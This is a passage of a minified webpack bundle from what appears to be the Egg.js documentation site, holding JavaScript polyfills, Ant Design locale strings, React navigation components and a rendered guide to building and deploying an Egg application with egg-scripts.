a=n("Kdrj").charAt,r=n("lz/I"),l=n("RGX9"),o="String Iterator",i=r.set,c=r.getterFor(o);l(String,"String",(function(e){i(this,{type:o,string:String(e),index:0})}),(function(){var e,t=c(this),n=t.string,r=t.index;return r>=n.length?{value:void 0,done:!0}:(e=a(n,r),t.index+=e.length,{value:e,done:!1})}))},bymz:function(e,t,n){"use strict";n.d(t,"a",(function(){return c}));var a=n("VGJu"),r=n("2EJr"),l=n("0YMn"),o=n("FU0I"),i=n("ylap");function c(e){var t=o["useRef"]({}),n=o["useState"]([]),c=Object(l["a"])(n,2),s=c[0],u=c[1];function d(n){var l=!0;e.add(n,(function(e,n){var c=n.key;if(e&&(!t.current[c]||l)){var s=o["createElement"](i["a"],Object(r["a"])({},n,{holder:e}));t.current[c]=s,u((function(e){var t=e.findIndex((function(e){return e.key===n.key}));if(-1===t)return[].concat(Object(a["a"])(e),[s]);var r=Object(a["a"])(e);return r[t]=s,r}))}l=!1}))}return[d,o["createElement"](o["Fragment"],null,s)]}},c3Uy:function(e,t,n){var a=n("WM7W");a("match")},c5h7:function(e,t,n){var a=n("0mt+"),r=n("xi+T");a({target:"Math",stat:!0},{scale:r})},cDb8:function(e,t,n){"use strict";var a=n("0mt+"),r=n("fd2C"),l=n("tS9j"),o=n("N0Us"),i=n("XaNN"),c=n("oyD1"),s=n("AaXQ"),u=n("vyxk"),d=n("zKw/"),m=n("XExY"),p=n("Xdqv"),h=n("q7Pv"),g=n("j9ts"),f=n("rSPa"),E=n("lz/I"),b=n("m4/z"),v=h("matchAll"),y="RegExp String",k=y+" Iterator",w=E.set,x=E.getterFor(k),j=RegExp.prototype,S=j.exec,C="".matchAll,A=!!C&&!p((function(){"a".matchAll(/./)})),L=function(e,t){var n,a=e.exec;if("function"==typeof a){if(n=a.call(e,t),"object"!=typeof n)throw TypeError("Incorrect exec result");return n}return S.call(e,t)},T=r((function(e,t,n,a){w(this,{type:k,regexp:e,string:t,global:n,unicode:a,done:!1})}),y,(function(){var e=x(this);if(e.done)return{value:void 0,done:!0};var t=e.regexp,n=e.string,a=L(t,n);return null===a?{value:void 0,done:e.done=!0}:e.global?(""==String(a[0])&&(t.lastIndex=f(n,o(t.lastIndex),e.unicode)),{value:a,done:!1}):(e.done=!0,{value:a,done:!1})})),N=function(e){var t,n,a,r,l,i,s=c(this),u=String(e);return t=g(s,RegExp),n=s.flags,void 0===n&&s instanceof RegExp&&!("flags"in j)&&(n=d.call(s)),a=void 0===n?"":String(n),r=new t(t===RegExp?s.source:s,a),l=!!~a.indexOf("g"),i=!!~a.indexOf("u"),r.lastIndex=o(s.lastIndex),new T(r,u,l,i)};a({target:"String",proto:!0,forced:A},{matchAll:function(e){var t,n,a,r,o=l(this);if(null!=e){if(u(e)&&(t=String(l("flags"in j?e.flags:d.call(e))),!~t.indexOf("g")))throw TypeError("`.matchAll` does not allow non-global regexes");if(A)return C.apply(o,arguments);if(a=e[v],void 0===a&&b&&"RegExp"==s(e)&&(a=N),null!=a)return i(a).call(e,o)}else if(A)return C.apply(o,arguments);return n=String(o),r=new RegExp(e,"g"),b?N.call(r,n):r[v](n)}}),b||v in j||m(j,v,N)},cGTW:function(e,t,n){"use strict";var a=n("00LS"),r=n("2EJr"),l={locale:"en_US",today:"Today",now:"Now",backToToday:"Back to today",ok:"OK",clear:"Clear",month:"Month",year:"Year",timeSelect:"select time",dateSelect:"select date",weekSelect:"Choose a week",monthSelect:"Choose a month",yearSelect:"Choose a year",decadeSelect:"Choose a decade",yearFormat:"YYYY",dateFormat:"M/D/YYYY",dayFormat:"D",dateTimeFormat:"M/D/YYYY HH:mm:ss",monthBeforeYear:!0,previousMonth:"Previous month (PageUp)",nextMonth:"Next month (PageDown)",previousYear:"Last year (Control + left)",nextYear:"Next year (Control + right)",previousDecade:"Last decade",nextDecade:"Next decade",previousCentury:"Last century",nextCentury:"Next century"},o=l,i={placeholder:"Select time",rangePlaceholder:["Start time","End time"]},c=i,s={lang:Object(r["a"])({placeholder:"Select date",yearPlaceholder:"Select year",quarterPlaceholder:"Select quarter",monthPlaceholder:"Select month",weekPlaceholder:"Select week",rangePlaceholder:["Start date","End date"],rangeYearPlaceholder:["Start year","End year"],rangeQuarterPlaceholder:["Start quarter","End quarter"],rangeMonthPlaceholder:["Start month","End month"],rangeWeekPlaceholder:["Start week","End week"]},o),timePickerLocale:Object(r["a"])({},c)},u=s,d=u,m="${label} is not a valid ${type}",p={locale:"en",Pagination:a["a"],DatePicker:u,TimePicker:c,Calendar:d,global:{placeholder:"Please select"},Table:{filterTitle:"Filter menu",filterConfirm:"OK",filterReset:"Reset",filterEmptyText:"No filters",filterCheckall:"Select all items",filterSearchPlaceholder:"Search in filters",emptyText:"No data",selectAll:"Select current page",selectInvert:"Invert current page",selectNone:"Clear all data",selectionAll:"Select all data",sortTitle:"Sort",expand:"Expand row",collapse:"Collapse row",triggerDesc:"Click to sort descending",triggerAsc:"Click to sort ascending",cancelSort:"Click to cancel sorting"},Modal:{okText:"OK",cancelText:"Cancel",justOkText:"OK"},Popconfirm:{okText:"OK",cancelText:"Cancel"},Transfer:{titles:["",""],searchPlaceholder:"Search here",itemUnit:"item",itemsUnit:"items",remove:"Remove",selectCurrent:"Select current page",removeCurrent:"Remove current page",selectAll:"Select all data",removeAll:"Remove all data",selectInvert:"Invert current page"},Upload:{uploading:"Uploading...",removeFile:"Remove file",uploadError:"Upload error",previewFile:"Preview file",downloadFile:"Download file"},Empty:{description:"No data"},Icon:{icon:"icon"},Text:{edit:"Edit",copy:"Copy",copied:"Copied",expand:"Expand"},PageHeader:{back:"Back"},Form:{optional:"(optional)",defaultValidateMessages:{default:"Field validation error for ${label}",required:"Please enter ${label}",enum:"${label} must be one of [${enum}]",whitespace:"${label} cannot be a blank character",date:{format:"${label} date format is invalid",parse:"${label} cannot be converted to a date",invalid:"${label} is an invalid date"},types:{string:m,method:m,array:m,object:m,number:m,date:m,boolean:m,integer:m,float:m,regexp:m,email:m,url:m,hex:m},string:{len:"${label} must be ${len} characters",min:"${label} must be at least ${min} characters",max:"${label} must be up to ${max} characters",range:"${label} must be between ${min}-${max} characters"},number:{len:"${label} must be equal to ${len}",min:"${label} must be minimum ${min}",max:"${label} must be maximum ${max}",range:"${label} must be between ${min}-${max}"},array:{len:"Must be ${len} ${label}",min:"At least ${min} ${label}",max:"At most ${max} ${label}",range:"The amount of ${label} must be between ${min}-${max}"},pattern:{mismatch:"${label} does not match the pattern ${pattern}"}}},Image:{preview:"Preview"}};t["a"]=p},cPel:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Launching application via ",r.a.createElement("code",null,"egg-bin dev")," will bring something magical to help people to develop in high efficiency. However, actually, those features are not required in production or any other environment. Let's walk through and learn how to deploy your application in Egg's way."),r.a.createElement("p",null,"There are two steps to achieve building once and deploying multiply from source code to runtime."),r.a.createElement("h2",{id:"build"},r.a.createElement(l["AnchorLink"],{to:"#build","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Build"),r.a.createElement("p",null,"In the stage, you don't need to compile JavaScript files unless TypeScript or Babel(ES6 features) are involved in stack."),r.a.createElement("p",null,"Generally, before deploying the application, dependencies will be installed with ",r.a.createElement("code",null,"NODE_ENV=production")," or ",r.a.createElement("code",null,"--production"),", which will exclude ",r.a.createElement("code",null,"devDependencies")," because those used in development may increase the size of package released or even create pitfalls that you never expect."),r.a.createElement(o["a"],{code:"$ cd baseDir\n$ npm install --production\n$ tar -zcvf ../release.tgz .",lang:"bash"}),r.a.createElement("p",null,"Both the application and dependencies will be packed into a tgz file, what you are going to do is unzipping and launching it."),r.a.createElement("p",null,"Reusable package brings a few pros in:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Environments in building and runtime are different, try to keep the later environment pure and stable."),r.a.createElement("li",null,"Abbreviating publish progress and making rollback without hassle.")),r.a.createElement("h2",{id:"deploy"},r.a.createElement(l["AnchorLink"],{to:"#deploy","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Deploy"),r.a.createElement("p",null,"Node.js(",r.a.createElement("code",null,">= 14.20.0"),") is required so that you should make sure it is pre-installed in runtime environment."),r.a.createElement("p",null,"Egg takes ",r.a.createElement("code",null,"egg-cluster")," to create ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/docs/source/en/core/cluster-and-ipc.md#master"},"Master")," process, which you can rely on to secure the application instead of daemon manager like ",r.a.createElement(l["Link"],{to:"https://github.com/Unitech/pm2"},"pm2"),". The API is also really convenient for developers to achieve that, just ",r.a.createElement("code",null,"egg.startCluster"),"."),r.a.createElement("p",null,"And framework also provide ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts"},"egg-scripts")," for developers to start/stop application at prod mode."),r.a.createElement("p",null,"Firstly, we need to import ",r.a.createElement("code",null,"egg-scripts")," as ",r.a.createElement("code",null,"dependencies"),":"),r.a.createElement(o["a"],{code:"$ npm i egg-scripts --save",lang:"bash"}),r.a.createElement("p",null,"Then add ",r.a.createElement("code",null,"npm scripts")," to ",r.a.createElement("code",null,"package.json"),":"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "start": "egg-scripts start --daemon",\n    "stop": "egg-scripts stop"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"Then we are able to use ",r.a.createElement("code",null,"npm start")," and ",r.a.createElement("code",null,"npm stop")," to manage application."),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Note: ",r.a.createElement("code",null,"egg-scripts")," has limited support for Windows, see ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts/pull/22"},"#22"),".")),r.a.createElement("h3",{id:"start"},r.a.createElement(l["AnchorLink"],{to:"#start","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Start"),r.a.createElement(o["a"],{code:"$ egg-scripts start --port=7001 --daemon --title=egg-server-showcase",lang:"bash"}),r.a.createElement("p",null,"Options:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"--port=7001")," http server port, will use ",r.a.createElement("code",null,"process.env.PORT"),", default to ",r.a.createElement("code",null,"7001"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"--daemon")," whether run at background, so you don't need ",r.a.createElement("code",null,"nohup"),". Ignore this when the application run in docker instance."),r.a.createElement("li",null,r.a.createElement("code",null,"--env=prod")," then framework env, will use ",r.a.createElement("code",null,"process.env.EGG_SERVER_ENV"),", default to ",r.a.createElement("code",null,"prod"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"--workers=2")," worker count, default to cpu cores, which can leverage the capability of the cpu."),r.a.createElement("li",null,r.a.createElement("code",null,"--title=egg-server-showcase")," convenient for ",r.a.createElement("code",null,"ps + grep"),", default to ",r.a.createElement("code",null,"egg-server-$","{","appname","}"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"--framework=yadan")," config ",r.a.createElement("code",null,"egg.framework")," at ",r.a.createElement("code",null,"package.json")," or pass this args, when you are using ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"Custom Framework"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"--ignore-stderr")," ignore the std err at start up\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"--https.key")," specify the https key full path, if start the server with https."),r.a.createElement("li",null,r.a.createElement("code",null,"--https.cert")," specify the https certificate full path, if start the server with https."),r.a.createElement("li",null,"support all options from ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster"),", such as ",r.a.createElement("code",null,"--port"),".")),r.a.createElement("p",null,"More about ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts"},"egg-scripts")," and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," documents."),r.a.createElement("h4",{id:"dispatch-with-arguments"},r.a.createElement(l["AnchorLink"],{to:"#dispatch-with-arguments","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Dispatch with Arguments"),r.a.createElement("p",null,"Arguments of dispatch can be configured in ",r.a.createElement("code",null,"config.","{","env","}",".js"),"."),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.cluster = {\n  listen: {\n    port: 7001,\n    hostname: '127.0.0.1', // It is not recommended to set the hostname to '0.0.0.0', which will allow connections from external networks and sources, please use it if you know the risk.\n    // path: '/var/run/egg.sock',\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://nodejs.org/api/http.html#http_server_listen_port_hostname_backlog_callback"},"server.listen")," supports arguments including ",r.a.createElement("code",null,"path"),", ",r.a.createElement("code",null,"port")," and ",r.a.createElement("code",null,"hostname")," to change dispatching behavior. One thing you should know is that the ",r.a.createElement("code",null,"port")," in ",r.a.createElement("code",null,"egg.startCluster")," will override the one in application config."),r.a.createElement("h3",{id:"stop"},r.a.createElement(l["AnchorLink"],{to:"#stop","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Stop"),r.a.createElement(o["a"],{code:"$ egg-scripts stop",lang:"bash"}),r.a.createElement("p",null,"This command will kill master process which will handler and notice worker and agent to gracefull exit."),r.a.createElement("p",null,"Also you can manually call ",r.a.createElement("code",null,'ps -eo "pid,command" | grep -- "--title=egg-server"')," to find master process then ",r.a.createElement("code",null,"kill")," without ",r.a.createElement("code",null,"-9"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},ciTX:function(e,t,n){"use strict";n.d(t,"a",(function(){return o}));var a=n("FU0I"),r=n.n(a),l=n("YeTV");function o(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=[];return r.a.Children.forEach(e,(function(e){(void 0!==e&&null!==e||t.keepEmpty)&&(Array.isArray(e)?n=n.concat(o(e)):Object(l["isFragment"])(e)&&e.props?n=n.concat(o(e.props.children,t)):n.push(e))})),n}},csaP:function(e,t){function n(e){if("undefined"!==typeof Symbol&&null!=e[Symbol.iterator]||null!=e["@@iterator"])return Array.from(e)}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},"d2/7":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("XaNN"),i=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{isDisjointFrom:function(e){var t=l(this),n=o(t.has);return!i(e,(function(e){if(!0===n.call(t,e))return i.stop()})).stopped}})},d9lq:function(e,t,n){"use strict";function a(){return!("undefined"===typeof window||!window.document||!window.document.createElement)}n.d(t,"a",(function(){return a}))},dDJo:function(e,t,n){"use strict";function a(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}n.d(t,"a",(function(){return a}))},dG76:function(e,t,n){},dQn4:function(e,t){var n=Object.prototype,a=n.toString;function r(e){return a.call(e)}e.exports=r},dX65:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("XaNN");a({target:"Map",proto:!0,real:!0,forced:r},{update:function(e,t){var n=l(this),a=arguments.length;o(t);var r=n.has(e);if(!r&&a<3)throw TypeError("Updating absent value");var i=r?n.get(e):o(a>2?arguments[2]:void 0)(e,n);return n.set(e,t(i,e,n)),n}})},dbDl:function(e,t,n){var a=n("WM7W");a("dispose")},dcBQ:function(e,t,n){"use strict";e.exports=function(){if("function"!==typeof Symbol||"function"!==typeof Object.getOwnPropertySymbols)return!1;if("symbol"===typeof Symbol.iterator)return!0;var e={},t=Symbol("test"),n=Object(t);if("string"===typeof t)return!1;if("[object Symbol]"!==Object.prototype.toString.call(t))return!1;if("[object Symbol]"!==Object.prototype.toString.call(n))return!1;var a=42;for(t in e[t]=a,e)return!1;if("function"===typeof Object.keys&&0!==Object.keys(e).length)return!1;if("function"===typeof Object.getOwnPropertyNames&&0!==Object.getOwnPropertyNames(e).length)return!1;var r=Object.getOwnPropertySymbols(e);if(1!==r.length||r[0]!==t)return!1;if(!Object.prototype.propertyIsEnumerable.call(e,t))return!1;if("function"===typeof Object.getOwnPropertyDescriptor){var l=Object.getOwnPropertyDescriptor(e,t);if(l.value!==a||!0!==l.enumerable)return!1}return!0}},dg6B:function(e,t,n){"use strict";function a(e){return a="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},a(e)}function r(){r=function(){return e};var e={},t=Object.prototype,n=t.hasOwnProperty,l="function"==typeof Symbol?Symbol:{},o=l.iterator||"@@iterator",i=l.asyncIterator||"@@asyncIterator",c=l.toStringTag||"@@toStringTag";function s(e,t,n){return Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{s({},"")}catch(L){s=function(e,t,n){return e[t]=n}}function u(e,t,n,a){var r=t&&t.prototype instanceof p?t:p,l=Object.create(r.prototype),o=new S(a||[]);return l._invoke=function(e,t,n){var a="suspendedStart";return function(r,l){if("executing"===a)throw new Error("Generator is already running");if("completed"===a){if("throw"===r)throw l;return A()}for(n.method=r,n.arg=l;;){var o=n.delegate;if(o){var i=w(o,n);if(i){if(i===m)continue;return i}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if("suspendedStart"===a)throw a="completed",n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);a="executing";var c=d(e,t,n);if("normal"===c.type){if(a=n.done?"completed":"suspendedYield",c.arg===m)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(a="completed",n.method="throw",n.arg=c.arg)}}}(e,n,o),l}function d(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(L){return{type:"throw",arg:L}}}e.wrap=u;var m={};function p(){}function h(){}function g(){}var f={};s(f,o,(function(){return this}));var E=Object.getPrototypeOf,b=E&&E(E(C([])));b&&b!==t&&n.call(b,o)&&(f=b);var v=g.prototype=p.prototype=Object.create(f);function y(e){["next","throw","return"].forEach((function(t){s(e,t,(function(e){return this._invoke(t,e)}))}))}function k(e,t){function r(l,o,i,c){var s=d(e[l],e,o);if("throw"!==s.type){var u=s.arg,m=u.value;return m&&"object"==a(m)&&n.call(m,"__await")?t.resolve(m.__await).then((function(e){r("next",e,i,c)}),(function(e){r("throw",e,i,c)})):t.resolve(m).then((function(e){u.value=e,i(u)}),(function(e){return r("throw",e,i,c)}))}c(s.arg)}var l;this._invoke=function(e,n){function a(){return new t((function(t,a){r(e,n,t,a)}))}return l=l?l.then(a,a):a()}}function w(e,t){var n=e.iterator[t.method];if(void 0===n){if(t.delegate=null,"throw"===t.method){if(e.iterator["return"]&&(t.method="return",t.arg=void 0,w(e,t),"throw"===t.method))return m;t.method="throw",t.arg=new TypeError("The iterator does not provide a 'throw' method")}return m}var a=d(n,e.iterator,t.arg);if("throw"===a.type)return t.method="throw",t.arg=a.arg,t.delegate=null,m;var r=a.arg;return r?r.done?(t[e.resultName]=r.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,m):r:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,m)}function x(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function j(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function S(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(x,this),this.reset(!0)}function C(e){if(e){var t=e[o];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var a=-1,r=function t(){for(;++a<e.length;)if(n.call(e,a))return t.value=e[a],t.done=!1,t;return t.value=void 0,t.done=!0,t};return r.next=r}}return{next:A}}function A(){return{value:void 0,done:!0}}return h.prototype=g,s(v,"constructor",g),s(g,"constructor",h),h.displayName=s(g,c,"GeneratorFunction"),e.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===h||"GeneratorFunction"===(t.displayName||t.name))},e.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,g):(e.__proto__=g,s(e,c,"GeneratorFunction")),e.prototype=Object.create(v),e},e.awrap=function(e){return{__await:e}},y(k.prototype),s(k.prototype,i,(function(){return this})),e.AsyncIterator=k,e.async=function(t,n,a,r,l){void 0===l&&(l=Promise);var o=new k(u(t,n,a,r),l);return e.isGeneratorFunction(n)?o:o.next().then((function(e){return e.done?e.value:o.next()}))},y(v),s(v,c,"Generator"),s(v,o,(function(){return this})),s(v,"toString",(function(){return"[object Generator]"})),e.keys=function(e){var t=[];for(var n in e)t.push(n);return t.reverse(),function n(){for(;t.length;){var a=t.pop();if(a in e)return n.value=a,n.done=!1,n}return n.done=!0,n}},e.values=C,S.prototype={constructor:S,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(j),!e)for(var t in this)"t"===t.charAt(0)&&n.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function a(n,a){return o.type="throw",o.arg=e,t.next=n,a&&(t.method="next",t.arg=void 0),!!a}for(var r=this.tryEntries.length-1;r>=0;--r){var l=this.tryEntries[r],o=l.completion;if("root"===l.tryLoc)return a("end");if(l.tryLoc<=this.prev){var i=n.call(l,"catchLoc"),c=n.call(l,"finallyLoc");if(i&&c){if(this.prev<l.catchLoc)return a(l.catchLoc,!0);if(this.prev<l.finallyLoc)return a(l.finallyLoc)}else if(i){if(this.prev<l.catchLoc)return a(l.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<l.finallyLoc)return a(l.finallyLoc)}}}},abrupt:function(e,t){for(var a=this.tryEntries.length-1;a>=0;--a){var r=this.tryEntries[a];if(r.tryLoc<=this.prev&&n.call(r,"finallyLoc")&&this.prev<r.finallyLoc){var l=r;break}}l&&("break"===e||"continue"===e)&&l.tryLoc<=t&&t<=l.finallyLoc&&(l=null);var o=l?l.completion:{};return o.type=e,o.arg=t,l?(this.method="next",this.next=l.finallyLoc,m):this.complete(o)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),m},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),j(n),m}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var a=n.completion;if("throw"===a.type){var r=a.arg;j(n)}return r}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,n){return this.delegate={iterator:C(e),resultName:t,nextLoc:n},"next"===this.method&&(this.arg=void 0),m}},e}n.d(t,"a",(function(){return r}))},dj3V:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("zzMO"),i=(n("QRVW"),function(e){var t=e.location,n=Object(a["useContext"])(l["context"]),i=n.base,c=n.locale,s=n.config.locales,u=s.find((function(e){var t=e.name;return t!==c}));function d(e){var n=i.replace("/".concat(c),""),a=t.pathname.replace(new RegExp("^".concat(i,"(/|$)")),"".concat(n,"$1"))||"/";if(e!==s[0].name){var r="".concat(n,"/").concat(e).replace(/\/\//,"/"),l=t.pathname.replace(i.replace(/^\/$/,"//"),"");return"".concat(r).concat(l).replace(/\/$/,"")}return a}return u?r.a.createElement("div",{className:"__dumi-default-locale-select","data-locale-count":s.length},s.length>2?r.a.createElement("select",{value:c,onChange:function(e){return o["a"].push(d(e.target.value))}},s.map((function(e){return r.a.createElement("option",{value:e.name,key:e.name},e.label)}))):r.a.createElement(l["Link"],{to:d(u.name)},u.label)):null}),c=i,s=(n("8bof"),function(e){var t=e.onMobileMenuClick,n=e.navPrefix,o=e.location,i=e.darkPrefix,s=Object(a["useContext"])(l["context"]),u=s.base,d=s.config,m=d.mode,p=d.title,h=d.logo,g=s.nav;return r.a.createElement("div",{className:"__dumi-default-navbar","data-mode":m},r.a.createElement("button",{className:"__dumi-default-navbar-toggle",onClick:t}),r.a.createElement(l["Link"],{className:"__dumi-default-navbar-logo",style:{backgroundImage:h&&"url('".concat(h,"')")},to:u,"data-plaintext":!1===h||void 0},p),r.a.createElement("nav",null,n,g.map((function(e){var t,n=Boolean(null===(t=e.children)||void 0===t?void 0:t.length)&&r.a.createElement("ul",null,e.children.map((function(e){return r.a.createElement("li",{key:e.path},r.a.createElement(l["NavLink"],{to:e.path},e.title))})));return r.a.createElement("span",{key:e.title||e.path},e.path?r.a.createElement(l["NavLink"],{to:e.path,key:e.path},e.title):e.title,n)})),r.a.createElement("div",{className:"__dumi-default-navbar-tool"},r.a.createElement(c,{location:o}),i)))}),u=s,d=(n("3MAR"),["slugs"]);function m(){return m=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},m.apply(this,arguments)}function p(e,t){if(null==e)return{};var n,a,r=h(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}function h(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}var g=function(e){var t=e.slugs,n=p(e,d);return r.a.createElement("ul",m({role:"slug-list"},n),t.filter((function(e){var t=e.depth;return t>1&&t<4})).map((function(e){return r.a.createElement("li",{key:e.heading,title:e.value,"data-depth":e.depth},r.a.createElement(l["AnchorLink"],{to:"#".concat(e.heading)},r.a.createElement("span",null,e.value)))})))},f=g,E=(n("Warj"),function(e){var t=e.mobileMenuCollapsed,n=e.location,o=e.darkPrefix,i=Object(a["useContext"])(l["context"]),s=i.config,u=s.logo,d=s.title,m=s.description,p=s.mode,h=s.repository.url,g=i.menu,E=i.nav,b=i.base,v=i.meta,y=Boolean((v.hero||v.features||v.gapless)&&"site"===p)||!1===v.sidemenu||void 0;return r.a.createElement("div",{className:"__dumi-default-menu","data-mode":p,"data-hidden":y,"data-mobile-show":!t||void 0},r.a.createElement("div",{className:"__dumi-default-menu-inner"},r.a.createElement("div",{className:"__dumi-default-menu-header"},r.a.createElement(l["Link"],{to:b,className:"__dumi-default-menu-logo",style:{backgroundImage:u&&"url('".concat(u,"')")}}),r.a.createElement("h1",null,d),r.a.createElement("p",null,m),/github\.com/.test(h)&&"doc"===p&&r.a.createElement("p",null,r.a.createElement("object",{type:"image/svg+xml",data:"https://img.shields.io/github/stars".concat(h.match(/((\/[^\/]+){2})$/)[1],"?style=social")}))),r.a.createElement("div",{className:"__dumi-default-menu-mobile-area"},!!E.length&&r.a.createElement("ul",{className:"__dumi-default-menu-nav-list"},E.map((function(e){var t,n=Boolean(null===(t=e.children)||void 0===t?void 0:t.length)&&r.a.createElement("ul",null,e.children.map((function(e){return r.a.createElement("li",{key:e.path||e.title},r.a.createElement(l["NavLink"],{to:e.path},e.title))})));return r.a.createElement("li",{key:e.path||e.title},e.path?r.a.createElement(l["NavLink"],{to:e.path},e.title):e.title,n)}))),r.a.createElement(c,{location:n}),o),r.a.createElement("ul",{className:"__dumi-default-menu-list"},!y&&g.map((function(e){var t,a=Boolean(null===(t=v.slugs)||void 0===t?void 0:t.length),o=e.children&&Boolean(e.children.length),i="menu"===v.toc&&!o&&a&&e.path===n.pathname.replace(/([^^])\/$/,"$1"),c=o?e.children.map((function(e){return e.path})):[e.path,n.pathname.startsWith("".concat(e.path,"/"))&&v.title===e.title?n.pathname:null];return r.a.createElement("li",{key:e.path||e.title},r.a.createElement(l["NavLink"],{to:e.path,isActive:function(){return c.includes(n.pathname)}},e.title),Boolean(e.children&&e.children.length)&&r.a.createElement("ul",null,e.children.map((function(e){return r.a.createElement("li",{key:e.path},r.a.createElement(l["NavLink"],{to:e.path,exact:!0},r.a.createElement("span",null,e.title)),Boolean("menu"===v.toc&&"undefined"!==typeof window&&e.path===n.pathname&&a)&&r.a.createElement(f,{slugs:v.slugs}))}))),i&&r.a.createElement(f,{slugs:v.slugs}))})))))}),b=E;n("YRQD");function v(){return v=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},v.apply(this,arguments)}function y(e,t){return S(e)||j(e,t)||w(e,t)||k()}function k(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function w(e,t){if(e){if("string"===typeof e)return x(e,t);var 